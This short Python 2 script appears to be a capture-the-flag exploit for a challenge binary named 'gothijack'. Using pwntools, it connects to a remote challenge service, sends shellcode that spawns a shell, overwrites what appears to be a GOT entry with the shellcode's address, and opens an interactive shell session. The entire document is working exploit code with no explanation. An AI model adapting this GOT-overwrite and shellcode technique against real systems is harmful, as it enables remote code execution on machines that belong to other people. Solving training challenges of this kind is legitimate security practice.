#!/usr/bin/env python2

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

f = ELF('./gothijack')

p = remote('isc.taiwan-te.ch', 10003)

p.sendlineafter('?', asm(shellcraft.sh()))
sleep(0.5)
p.sendline('0x601018')
sleep(0.5)
p.sendline('0x601080')

p.interactive()
p.close()

